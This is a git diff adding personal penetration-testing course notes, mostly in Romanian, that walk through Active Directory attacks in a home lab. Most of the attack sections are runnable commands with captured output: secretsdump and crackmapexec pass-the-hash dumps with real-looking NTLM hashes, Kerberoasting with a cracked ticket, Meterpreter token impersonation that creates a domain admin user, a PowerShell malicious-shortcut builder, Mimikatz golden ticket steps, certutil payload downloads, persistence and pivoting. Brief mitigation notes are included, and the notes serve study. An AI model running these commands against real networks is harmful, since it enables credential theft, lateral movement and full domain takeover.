@@ -853,7 +853,7 @@ Ideiea consta in aceea ca daca nu a fost nici o logare este posibil sa avem un a
 
 Acest lucru previne atacatorul să se prezinte ca DNS/DHCPv6 fals (ce face mitm6).
 
-⚠ Dezactivarea completă a IPv6 poate crea efecte nedorite, de aceea blocarea traficului recomandat este preferată.
+Dezactivarea completă a IPv6 poate crea efecte nedorite, de aceea blocarea traficului recomandat este preferată.
 
 2. Dezactivează WPAD dacă nu este folosit
 
@@ -920,7 +920,7 @@ Try unusual attack paths, forgotten systems, weird ports, abandoned applications
 ![README-2025-11-21-10-16-18.png](../src/img/README-2025-11-21-10-16-18.png)
 
 ## Attacking Active Directory: Post-Compromise Enumeration:
-✔ There are a few tools that offer quick and efficient enumeration:
+There are a few tools that offer quick and efficient enumeration:
 
         BloodHound
         PlumHound
@@ -928,9 +928,16 @@ Try unusual attack paths, forgotten systems, weird ports, abandoned applications
         PingCastle
         And whatever else your heart desires
 ### Domain Enumeration with ldapdomaindump:
-#TODO descriere
+
+ldapdomaindump este un instrument folosit pentru:
+
+        enumerarea obiectelor Active Directory
+        extragerea informațiilor publice sau semi-publice din LDAP
+        generarea unor rapoarte HTML/JSON cu toată structura domeniului
+
+Nu exploatează nimic — folosește interogări LDAP legitime, exact cum o fac utilitarele Windows.
 ```bash
-sudo ldapdomaindump ldaps://<IP> -u 'MARVEL\fcastle' -p Password1
+sudo ldapdomaindump ldaps://172.16.49.145 -u 'MARVEL\fcastle' -p Password1
 ```
 
 ### Domain Enumeration with Bloodhound:
@@ -944,3 +951,506 @@ Rulam `neo4j` pentru baza de date:
 ```bash
 sudo neo4j console
 ```
+Dupa ce rulam o sa vedem o adresa locala unde trebuie sa ne logam:
+```bash
+#Credintialele by defoult
+neo4j
+neo4j #This was change in axis-mambo-sheriff-smart-couple-8019
+```
+Pe urma rulam singur `bloodhound`:
+```bash
+sudo bloodhound 
+```
+In cazul meu a fost necesar sa schimb si fisierul de configuratie:
+```bash
+sudo nano /etc/bhapi/bhapi.json #Aici schimbam credintialele
+```
+Credintialele pentru `bloodhound`:
+```bash
+admin
+jR\GmSGB3=QVHr0w
+```
+Pentru a colecta datele ca ulterior acestea sa fie vizuabele rulam un colector:
+```bash
+sudo bloodhound-python -d MARVEL.local -u pparker -p Password1 -ns 172.16.49.144 -c all 
+...
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: marvel.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hydra-dc.marvel.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: hydra-dc.marvel.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: hydra-dc.marvel.local
+INFO: Found 8 users
+INFO: Found 52 groups
+INFO: Found 3 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SPIDERMAN.MARVEL.local
+INFO: Querying computer: THEPANISHER.MARVEL.local
+INFO: Querying computer: HYDRA-DC.MARVEL.local
+INFO: Done in 00M 01S
+```
+
+### Domain enumeration with Plumhound:
+[PlumHound](https://github.com/PlumHound/PlumHound) 
+```bash
+#install guide & use
+git clone https://github.com/PlumHound/PlumHound
+sudo pip3 install --break-system-packages  -r requirements.txt
+#run plumhound
+sudo python3 PlumHound.py --easy -p axis-mambo-sheriff-smart-couple-8019 
+```
+![README-2025-12-01-13-39-56.png](../src/img/README-2025-12-01-13-39-56.png)
+```bash
+sudo python3 PlumHound.py -x tasks/default.tasks -p "axis-mambo-sheriff-smart-couple-8019"
+```
+Dupa scanarea data o sa avem tot in fisierul `index.html` 
+```bash
+firefox index.html #si putem vede informatiea despre retea noastra
+```
+
+### Domain Enumeration with PingCastle:
+[PingCastle](https://www.pingcastle.com/)
+Un tool pentru reteau de domain controler si tot cei legat de accesta este instalat pe windows.
+
+
+## Attacking Active Directory: Post-Compromise Attacks:
+
+După ce ai intrat în sistem, ce poți face în continuare?
+
+### Pass Attacks:
+Dacă obținem parola în clar sau dump-ul de hash-uri din SAM, putem utiliza aceste informații pentru a accesa alte sisteme din rețea, facilitând mișcarea laterală.
+```bash
+crackmapexec smb 172.16.49.0/24 -u pparker -d MARVEL.local -p Password1 
+```
+![README-2025-12-01-14-11-22.png](../src/img/README-2025-12-01-14-11-22.png)
+```bash
+impacket-secretsdump MARVEL.local/pparker:Password1@172.16.49.146 #pe AC nu merge sa facem dump la fisierul (NTDS.DIT secrets) posibil pe el lucreaza antivirus
+...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
+peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-11-17 14:08:56+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:14337db340771011822d053b2c3d8a0ca3f92c0713f242931fb5af3d56878c6c
+MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:b66a5a523ebb8afb4a9b6f98c4164c97
+MARVEL\SPIDERMAN$:des-cbc-md5:20ef269dc8f1807c
+MARVEL\SPIDERMAN$:plain_password_hex:5e00570066007100530070003b0041002a0034002f0043002e005a0071003d0066003c006000480053004800730028002d0021007700560046005f0046006d0046003d0054006100760066003e0053005f004f0046005a0074006c0049002300370037004d004d0036002a0024005f006200410078006f00770020006a004500770076004d006b005100200041002c00260041006e0065004400580059006c0063003c002f0030004400540048003b005c0049005600660043006f003900570039006d006e004d0042005b00390027003a003300700028006100240066003e0045003d0043003c00260071003e006f00
+MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:dca2f030f367e01f8ae9720256eb2320:::
+```
+![README-2025-12-01-14-23-01.png](../src/img/README-2025-12-01-14-23-01.png)
+```bash
+crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth #run this ehen bottw machines is run to test 
+```
+![README-2025-12-01-14-29-08.png](../src/img/README-2025-12-01-14-29-08.png)
+
+
+```bash
+crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam 
+...
+MB         172.16.49.146   445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+SMB         172.16.49.146   445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.49.146   445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.49.146   445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
+SMB         172.16.49.146   445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+```
+Credintialele pentru `frankcastle` - `frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`
+
+```bash
+crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
+```
+
+```bash
+crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
+```
+
+```bash
+crackmapexec smb -L 
+```
+
+```bash
+crackmapexec smb 172.16.49.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
+```
+![README-2025-12-01-15-34-58.png](../src/img/README-2025-12-01-15-34-58.png)
+
+```bash
+cmedb 
+help 
+creds
+
+```
+### Dumping and Cracking Hashes:
+```bash
+impacket-secretsdump MARVEL.local/pparker:'Password1'@172.16.49.146
+```
+![README-2025-12-01-16-13-22.png](../src/img/README-2025-12-01-16-13-22.png)
+SAM hashes:
+```bash
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99030778380ee9cb65e98dcdbef32a76:::
+peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+
+```
+`WDigest` - protocol vechi  
+
+```bash
+impacket-secretsdump Administrator:@172.16.49.145 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+```
+![README-2025-12-01-16-24-49.png](../src/img/README-2025-12-01-16-24-49.png)
+```bash
+llmnr -> fcastle hash -> cracked -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts
+```
+Crack the password:
+```bash
+hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -O 
+```
+###  Pass Attack Mitigations:
+Pass the Hash / Pass the Password – Măsuri de Mitigare
+Este dificil să prevenim complet aceste atacuri, dar putem face situația mult mai dificilă pentru un atacator prin:
+
+🔹 Limitarea reutilizării conturilor:
+
+        Evită reutilizarea aceleiași parole pentru conturile de administrator local
+        Dezactivează conturile Guest și Administrator
+        Limitează cine poate fi administrator local (principiul privilegiului minim)
+
+🔹 Utilizarea de parole puternice:
+
+        Cu cât sunt mai lungi, cu atât mai bine (ideal >14 caractere)
+        Evită folosirea cuvintelor comune
+        Frasele lungi sunt de preferat („I like long sentences”)
+
+🔹 Privilege Access Management (PAM):
+
+        Check-out/check-in pentru conturile sensibile doar când este necesar
+        Rotirea automată a parolelor la check-out și check-in
+        Reduce atacurile Pass-the-Hash / Pass-the-Password deoarece parolele și hash-urile sunt puternice și sunt rotate constant
+
+### Kerberoasting:
+![README-2025-12-02-10-30-18.png](../src/img/README-2025-12-02-10-30-18.png)
+
+```bash
+sudo impacket-GetUserSPNs  MARVEL.local/pparker:Password1 -dc-ip 172.16.49.144 -request
+...
+$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$e87a37398aebe158ab829eba9f3ac878$6a5a81d1c96f5dcdb56d22c50ad0c225868fdc58704ea5e0708a5ebda00559157dfa36986d01cfa171dd74e018f1b00599cd3f09fd376a0f7c3b9da42df49bc69e817a69940d1e619c83977847175277a7f6ea1aa5d8887acbe717aee077cb35333240ee11d79d42d81c202186bbfb31f3c1497a554b3bf52d5d663c1f80a826b46b35b20c21f0437993a1417f6d12151c6a85e0b94aff09d9ff4211069a3c4a7e03cd58b54890f6459df1cdbda49ef7763dde86546c4e5cda4d4bd297144beadb2790c2c17e4486f5c07bd18b8eef46a58c9583ba0c3d3e69a582b93ec9bd14c31dc192f2cfd5489921c0d0e9b33853fadc88370b9db12231c08c51e6f83c16e6d7d02d5a77084583b6ded00d8385c197b44b4422ee94c8d338ba8738c641bc219b658e9bc80ce04143294a83a4946f8cf25cfaaf7f72b89a05000bfe780535bf553b26059b92b7cc25eec423d2e6e1affb5ea8e7b626d8a0ecb5cf0ca77144fedf70f1913cf39b0e0852680691f9300547c91aa3ab7e1aefc2cd05b81e52ff67d7d784236db0a4c71e2322b030be69104e7669f5bf574106793758deec9f014818e507c4808b272f6a77d14611adf399a21dfd9585b9d7259353424330f7f0542629d4072a753d05cbd4b4bbc8df0ada32ddb003f2c5f4a0cb494bb21b0e06edb1bba1f4be4c7838ca346f2f6661555f69f78d8ce80ce520accdb78a38e55cf85f2cd1fe53746d938024416e138bdb2c51e9f04ad8cbb47d98da0f911bbae1731d3211afa932c917bb74421800de070280425de4cc5c9dc1a72772680706fcb655f94f20fbf71cc60128fab2ca114d31f5b7609f1c97e78372de73d33cdafa3ef07a205578891ed025f408ad4b9070c9e8d676c278bc378cb80cb137b904bc404153661129f3a5b90346ed8da5a2d8460f31c6002ad84cf0cd9f044e0c22a547f5794f7470bcc652e7898c42869dcf200014783c7fb7bd836c030ced8468fc8ea46f6b015598b487b010c0cb74d71cb83061e99537ec3159171579e3005d53d08f2b12c054a778a6fd11192c67f99719c83c7f424a95f8436d4e6ee8b5b04d8a1dd01136f011d0e6348081ccf3b073e4f30a3a1e7ed4f52d13135724e3b59d89eaef6f416f9485aeadcc07fcd612d1dfb6a68c7bdd229a7bc11ba55c0ccad3c9d8e8cd94988d3a89d5ffb563deb71a34816daf8d1fb1e1ba432622fd00007cd390d363518e723151ff5831068aea9d5ddf81ff1a44a78b48ffe883ee71f2b17baf0fe37215bb9627ca4b227566aa252e285951874bd4d990058d79f257217c768f1d967244883503edca5e0060ee5d9e79cab69656bf3263ee4a931a6244932f0b0303ae2db590c2b7f9823b7ca027752196b5b3655f67c060b227b8297470644b83996b359f5bc6f88616b29ef8b49bcb2afac183ccd0ef9d2f11
+...
+#then after this crack with hashcat 
+hashcat -m 13100 kerberoast.txt rockyou.txt  
+...
+$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$e87a37398aebe158ab829eba9f3ac878$6a5a81d1c96f5dcdb56d22c50ad0c225868fdc58704ea5e0708a5ebda00559157dfa36986d01cfa171dd74e018f1b00599cd3f09fd376a0f7c3b9da42df49bc69e817a69940d1e619c83977847175277a7f6ea1aa5d8887acbe717aee077cb35333240ee11d79d42d81c202186bbfb31f3c1497a554b3bf52d5d663c1f80a826b46b35b20c21f0437993a1417f6d12151c6a85e0b94aff09d9ff4211069a3c4a7e03cd58b54890f6459df1cdbda49ef7763dde86546c4e5cda4d4bd297144beadb2790c2c17e4486f5c07bd18b8eef46a58c9583ba0c3d3e69a582b93ec9bd14c31dc192f2cfd5489921c0d0e9b33853fadc88370b9db12231c08c51e6f83c16e6d7d02d5a77084583b6ded00d8385c197b44b4422ee94c8d338ba8738c641bc219b658e9bc80ce04143294a83a4946f8cf25cfaaf7f72b89a05000bfe780535bf553b26059b92b7cc25eec423d2e6e1affb5ea8e7b626d8a0ecb5cf0ca77144fedf70f1913cf39b0e0852680691f9300547c91aa3ab7e1aefc2cd05b81e52ff67d7d784236db0a4c71e2322b030be69104e7669f5bf574106793758deec9f014818e507c4808b272f6a77d14611adf399a21dfd9585b9d7259353424330f7f0542629d4072a753d05cbd4b4bbc8df0ada32ddb003f2c5f4a0cb494bb21b0e06edb1bba1f4be4c7838ca346f2f6661555f69f78d8ce80ce520accdb78a38e55cf85f2cd1fe53746d938024416e138bdb2c51e9f04ad8cbb47d98da0f911bbae1731d3211afa932c917bb74421800de070280425de4cc5c9dc1a72772680706fcb655f94f20fbf71cc60128fab2ca114d31f5b7609f1c97e78372de73d33cdafa3ef07a205578891ed025f408ad4b9070c9e8d676c278bc378cb80cb137b904bc404153661129f3a5b90346ed8da5a2d8460f31c6002ad84cf0cd9f044e0c22a547f5794f7470bcc652e7898c42869dcf200014783c7fb7bd836c030ced8468fc8ea46f6b015598b487b010c0cb74d71cb83061e99537ec3159171579e3005d53d08f2b12c054a778a6fd11192c67f99719c83c7f424a95f8436d4e6ee8b5b04d8a1dd01136f011d0e6348081ccf3b073e4f30a3a1e7ed4f52d13135724e3b59d89eaef6f416f9485aeadcc07fcd612d1dfb6a68c7bdd229a7bc11ba55c0ccad3c9d8e8cd94988d3a89d5ffb563deb71a34816daf8d1fb1e1ba432622fd00007cd390d363518e723151ff5831068aea9d5ddf81ff1a44a78b48ffe883ee71f2b17baf0fe37215bb9627ca4b227566aa252e285951874bd4d990058d79f257217c768f1d967244883503edca5e0060ee5d9e79cab69656bf3263ee4a931a6244932f0b0303ae2db590c2b7f9823b7ca027752196b5b3655f67c060b227b8297470644b83996b359f5bc6f88616b29ef8b49bcb2afac183ccd0ef9d2f11:MYpassword123#
+...
+```
+Dupa asta vedem si parola pentru serviciul nostru 
+### Mitigation Strategies:
+- Strong Passwords 
+- Least privilege 
+
+### Token Impersonation Overview:
+Ce sunt token-urile?
+• Chei temporare care îți permit accesul la un sistem/rețea fără să introduci credențialele de fiecare dată când accesezi un fișier. Gândește-le ca pe niște „cookies” pentru computere.
+
+Două tipuri:
+• Delegate – Create pentru logarea într-o mașină sau folosirea Remote Desktop
+• Impersonate – „non-interactiv”, cum ar fi atașarea unui drive de rețea sau un script de logare în domeniu
+Exemplu:
+Afișează cu ce utilizator rulezi în sesiunea Meterpreter.
+```bash
+meterpreter > getuid
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+...
+Delegation Tokens Available
+===============================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+MARVEL\fcastle
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+===============================================
+No tokens available
+...
+meterpreter > impersonate_token MARVEL\\fcastle
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\fcastle
+```
+![README-2025-12-05-14-15-45.png](../src/img/README-2025-12-05-14-15-45.png)
+In cazul in care este logat administratorul putem deveni administrator luand tokenul acestuia:
+
+```bash
+use exploit/windows/smb/psexec
+set options
+exploit
+load incognito #aici si are loc incarcarea modulului care ne permite manipularea cu tickete dupa rulam
+help #aici trebuie sa vedem toate comenzile care sunt + comenzile care tin de incognito
+list_tokens -u 
+impersonat_token MARVEL\\administrator
+shell
+whoami # aici daca am facut correct trebuie sa vedem ca suntem marvel\administrator
+net user /add howkeye Password1@ /domain # putem si adauga un user nou pentru ulterios sa ne logam ca el 
+net group "Domain Admins" howkeye /ADD /DOMAIN #adaugam ca admin la AD 
+```
+![README-2025-12-04-13-46-18.png](../src/img/README-2025-12-04-13-46-18.png)
+
+Am realizat acest attac in laboratorul personal:
+
+### Token Impersonation Mitigation:
+Strategii de mitigare:
+• Limitarea permisiunilor pentru crearea token-urilor de către utilizatori/grupuri
+• Separarea pe niveluri a conturilor (account tiering)
+• Restricționarea accesului de administrator local
+
+### LNK File attacks:
+Un LNK file este un fișier shortcut Windows.
+Când utilizatorul deschide sau chiar pre-vizualizează .lnk-ul, Windows:
+- încearcă să acceseze resursa țintă (TargetPath)
+- dacă targetul este pe o rețea SMB (\IP\share)
+- Windows trimite automat credențiale NTLM către serverul SMB
+
+Crearea unui LNK malițios:
+```power shell
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.138.149\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+Atac automat — folosind CME / NetExec:
+```bash
+netexec smb <IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<IP>
+```
+
+Ce face?
+
+        Rulează modulul slinky din NetExec (succesori CME)
+        Creează automat un shortcut .lnk malițios pe sistemul țintă
+        TargetPath va arăta spre \\SERVER_IP\NAME
+
+În exemplu:
+
+LNK-ul creat se numește test
+
+Serverul SMB al atacatorului este 192.168.138.149
+
+Când utilizatorul logat pe sistemul vulnerabil:
+
+- apasă pe shortcut
+- un program accesează shortcutul
+- File Explorer îl pre-randează
+
+Windows trimite automat:
+
+        NTLMv2 hash
+        utilizator
+        domeniu
+        challenge token
+
+
+Un resurse foate util cu asa tip de attack cum facem prin word [Link](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)
+
+#TODO need to try to do this attack 
+
+
+### GPP / cPasswrod Attacks and Mitigations:
+Prezentare generală
+• Group Policy Preferences (GPP) a permis administratorilor să creeze politici care conțineau credențiale integrate
+• Aceste credențiale erau criptate și plasate într-un câmp numit „cPassword”
+• Cheia de decriptare a fost publicată accidental (ups)
+• Problema a fost reparată în MS14-025, dar asta nu previne utilizările mai vechi
+• ÎNCĂ RELEVANT ÎN PENTESTING
+
+Este un tip de attac foarte vechi practica la el nu o sa fie:
+![README-2025-12-05-14-24-08.png](../src/img/README-2025-12-05-14-24-08.png)
+
+### Mimikatz Overview:
+Prezentare generală
+• Unealtă folosită pentru a vizualiza și fura credențiale, a genera tichete Kerberos și a lansa diverse atacuri
+• Extrage (dump) credențialele stocate în memorie
+• Câteva dintre atacuri: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket și Golden Ticket
+
+
+### Credential Dumping with Mimikatz:
+Utilita se afla pe [github](https://github.com/gentilkiwi/mimikatz) se poate face download [here](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919) 
+
+![README-2025-12-04-14-38-57.png](../src/img/README-2025-12-04-14-38-57.png)
+
+#todo try this attack 
+
+### Post-Compromise Attack Strategy:
+![README-2025-12-04-14-51-24.png](../src/img/README-2025-12-04-14-51-24.png)
+
+`PAM`           - Privilege Access Management
+
+## We've Compromised the Domain - Now What?:
+### Post-Domain Compromise Attack Strategy:
+![README-2025-12-04-15-01-48.png](../src/img/README-2025-12-04-15-01-48.png)
+#todo text 
+
+### Dumping the NTDS.dit:
+![README-2025-12-04-15-08-10.png](../src/img/README-2025-12-04-15-08-10.png)
+
+```bash
+secretsdump.py MARVEL.local/howkeye:'Password1@'@<fcastle_IP> -just-dc-ntlm #todo run this attack and check 
+```
+#todo Extragem toate hashurile si pe urma le cracuim cu hashcat 
+```bash
+hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show 
+```
+
+### Golden Ticket Attacks Overview:
+
+Ce este?
+• Când compromitem contul krbtgt, practic deținem întregul domeniu
+• Putem solicita acces la orice resursă sau sistem din domeniu
+• Golden tickets = acces complet la fiecare mașină din domeniu
+
+Obținerea hash-ului krbtgt cu Mimikatz:
+Pentru a crea un Golden Ticket, trebuie să extragem hash-ul NTLM al contului krbtgt.
+Acest cont este responsabil pentru semnarea tuturor biletelor Kerberos din domeniu.
+Dacă îl compromitem → putem genera tichete valide pentru orice user.
+
+### Golden Ticket Attacks:
+```bash
+mimikatz# ptivilege::debug 
+mimikatz# lsadump::lsa /inject /name:krbtgt 
+#trebuei sa primim ticketele de kerberos
+....
+
+....
+mimikatz# kerberos::golden /User:Administrator /domain:marvel.local /sid:<mimikatz# lsadump::lsa /inject /name:krbtgt -> this return our sid> /krbtgt:<ticket_admin> /id:500 /ppt 
+misc::cmd #will open new prompt a simple cmd from this user
+```
+#TODO try to make this attack 
+
+## Additional Active Directory Attacks:
+### Section Overview:
+Prezentare generală
+• Vulnerabilitățile Active Directory apar în mod constant.
+• Câteva vulnerabilități majore recente includ:
+ • ZeroLogon
+ • PrintNightmare
+ • Sam the Admin
+• Merită să verifici existența acestor vulnerabilități, dar nu ar trebui să încerci să le exploatezi fără aprobarea clientului
+
+### Abusing ZeroLogon:
+What is [ZeroLogon?](https://www.trendmicro.com/en_us/what-is/zerologon.html)
+dirkjanm [CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) - #todo check if we can run this attack make snapshot before https://github.com/dirkjanm/CVE-2020-1472 we can run this scripts
+SecuraBV [ZeroLogon Checker](ttps://github.com/SecuraBV/CVE-2020-1472)
+
+### PrintNightmare (CVE-2021-1675):
+[cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
+[calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)
+#todo try this attack on AC  https://academy.tcm-sec.com/courses/1152300/lectures/33637715
+
+## Active Directory Case Studies:
+[AD Case Study #1](https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/) 
+[AD Case Study #2](https://tcm-sec.com/pentest-tales-002-digging-deep)
+AD Case Study #3 - FNew Macbook Pro Setup Procedure 
+
+## Post Exploitation:
+### File Transfers:
+- Certutil 
+```bash
+certutil.exec -urlcache -f http://<IP_addres>/file.txt file.txt
+```
+- HTTP
+```bash
+python -m SimpleHttpServer 80
+```
+- FTP
+```bash
+python -m pyftpdlib 21 (attacker machine)
+```
+### Maintaining Access:
+• Scripturi de persistență
+ • run persistence -h
+ • exploit/windows/local/persistence
+ • exploit/windows/local/registry_persistence
+
+• Task-uri programate (Scheduled Tasks)
+ • run scheduleme
+ • run schtaskabuse
+
+• Adăugarea unui utilizator
+ • net user hacker password123 /add
+
+### Pivoting:
+![README-2025-12-05-15-06-10.png](../src/img/README-2025-12-05-15-06-10.png)
+```bash
+cat /etc/proxychains4.conf #Aici trebuie specificat configuratiea 
+ssh -f -N -D 9050 -i pivot root@10.10.155.5 #transmite traficul prin ssh port forwarding
+proxychains nmap 10.10.10.5 #traficul o sa merga prin ssh si o cada la noi pe masina pe urma 
+proxychains xfreerdp /u:administrator /p:'PASS' /v:10.10.10.225 
+proxychains firefox
+```
+
+```bash
+sudo pip install sshuttle
+sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot" #todo de vazut ce face comanda data
+#putem rula scanari la retea fara proxychains 
+```
+[chisel](https://github.com/jpillora/chisel) - 
+
+### Cleaning UP:
+• Readu sistemul/rețeaua la starea inițială, așa cum era înainte să intri
+ • Elimină executabilele, scripturile și fișierele adăugate
+ • Elimină malware-ul, rootkit-urile și conturile de utilizator create
+ • Resetează setările la configurațiile originale
+
+## Web Application Enumeration, Revisited:
+
+### Installing Go:
+```bash
+git cloen https://github.com/Dewalt-arch/pimpmykali
+cd pimpmykali
+./pimpmykali.sh 
+#aici trebuie sa alegem ce dorim sa facem instalam reparam sau alt ceva :)
+```
+###  Finding Subdomains with Assetfinder:
+`assetfindr`                    - #todo descrierea la tool here 
+https://github.com/tomnomnom/assetfinder  #todo install and run to now how it works 
+
+### Finding Subdomains with Amass:
+[`amass`](https://github.com/owasp-amass/amass)                         -#todo descrierea la tool here 
+https://github.com/owasp-amass/amass #todo install and run to now how it works 
+
+### Finding Alive Domains with Httprobe:
+`Httprobe`                      -#
+
+### Screenshotting Websites with GoWitness:
+[GoWitness](https://github.com/sensepost/gowitness) -#todo descrierea la tool here 
+
+### Scripting for automating enumerate:
+sumrecon: https://github.com/thatonetester/sumrecon
+TCM's modified script - https://pastebin.com/MhE6zXVt
+
+### Additional Resources:
+[The Bug Hunter's Methodolog](https://www.youtube.com/watch?v=uKWu6yhnhbQ)
+
+[Nahamsec Recon Playlist](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA)
+
+## Find & Exploit Common Web Vulnerabilities:
+
+###  Lab Setup (full text instructions included in course notes):
+#todo set the labs
+#aici Am ramas Domain Enumeration with Bloodhound #TODO
